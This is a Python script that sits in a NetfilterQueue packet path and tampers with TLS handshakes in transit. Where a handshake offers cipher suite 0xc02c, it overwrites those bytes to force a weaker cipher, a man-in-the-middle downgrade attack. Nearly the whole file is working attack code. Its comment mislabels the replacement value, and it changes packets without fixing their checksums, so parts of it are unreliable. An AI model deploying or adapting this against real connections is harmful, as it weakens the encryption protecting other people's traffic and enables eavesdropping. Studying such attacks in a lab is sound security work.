#!/usr/bin/python3
from netfilterqueue import NetfilterQueue
from scapy.all import *

nfQueueID         = 0
maxPacketsToStore = 100

def packetReceived(pkt):
  print("Accepted a new packet...")
  
  ip = IP(pkt.get_payload())
  if not ip.haslayer("Raw"):                               # not the Handshake, forward
    pkt.accept();
  else:
    tcpPayload = ip["Raw"].load;                           # "Raw" corresponds to the TCP payload
    if tcpPayload[0] == 0x16 and tcpPayload[1] == 0x03 and tcpPayload[84] == 0xc0 and tcpPayload[85] == 0x2c:
      #print(pkt.get_payload()) 

      print("Packet that should be modified")

      msgBytes = pkt.get_payload()       # msgBytes is read-only, copy it
      msgBytes2 = [b for b in msgBytes]
      
      # find the location of these bytes in the entire packet
      a = msgBytes.index(b"\xc0\x2c")
      
      # replace there bytes with others coresponding to a weaker version (e.g TLS RSA WITh AES128CBC SHA)
      msgBytes2[a] =  0x00
      msgBytes2[a+1] = 0xff
      
      # modify the packet "on the fly"
      pkt.set_payload(bytes(msgBytes2))
      pkt.accept() 
    else:
      pkt.accept();

print("Binding to NFQUEUE", nfQueueID)
nfqueue = NetfilterQueue()
nfqueue.bind(nfQueueID, packetReceived, maxPacketsToStore) # binds to queue 0, use handler "packetReceived()"
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('Listener killed.')

nfqueue.unbind()